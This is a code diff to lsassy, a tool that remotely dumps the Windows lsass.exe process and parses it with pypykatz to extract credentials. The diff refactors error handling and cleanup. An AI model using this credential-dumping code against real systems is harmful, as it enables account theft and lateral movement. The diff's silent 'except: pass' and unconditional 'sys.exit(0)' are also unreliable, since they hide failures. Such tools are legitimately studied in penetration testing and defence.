@@ -7,6 +7,7 @@
 
 import pkg_resources
 import sys
+import signal
 from pypykatz.pypykatz import pypykatz
 from lsassy.impacketconnection import ImpacketConnection
 from lsassy.impacketfile import ImpacketFile
@@ -91,30 +92,40 @@ def run():
         return 3
 
     dumper = None
-    if not args.dumppath:
-        dumper = Dumper(conn, args, logger)
-        ifile = dumper.dump()
-        if not ifile:
-            logger.error("Process lsass.exe could not be dumped")
-            return 3
-        logger.success("Process lsass.exe has been dumped")
-    else:
-        ifile = ImpacketFile(conn, logger)
+    ifile = None
+    try:
+        if not args.dumppath:
+            dumper = Dumper(conn, args, logger)
+            ifile = dumper.dump()
+            if not ifile:
+                logger.error("Process lsass.exe could not be dumped")
+                return 4
+            logger.success("Process lsass.exe has been dumped")
+        else:
+            ifile = ImpacketFile(conn, logger)
+            try:
+                ifile.open(args.dumppath)
+            except Exception as e:
+                logger.error("lsass dump file does not exist. Use --debug flag for more details")
+                logger.debug("Error : {}".format(str(e)))
+                return 5
+        dumpfile = pypykatz.parse_minidump_external(ifile)
+        ifile.close()
+        parser = Parser(dumpfile, logger)
+        parser.output(args)
+    except KeyboardInterrupt as e:
+        print("\nQuitting gracefully...")
+    except Exception as e:
+        pass
+    finally:
         try:
-            ifile.open(args.dumppath)
+            ifile.close()
         except Exception as e:
-            logger.error("lsass dump file does not exist. Use --debug flag for more details")
-            logger.debug("Error : {}".format(str(e)))
-            return 4
-    dumpfile = pypykatz.parse_minidump_external(ifile)
-    ifile.close()
-    parser = Parser(dumpfile, logger)
-    parser.output(args)
-
-    if dumper is not None:
-        dumper.clean()
-    conn.close()
-    return 0
+            pass
+        if dumper is not None:
+            dumper.clean()
+        conn.close()
+        sys.exit(0)
 
 
 if __name__ == '__main__':
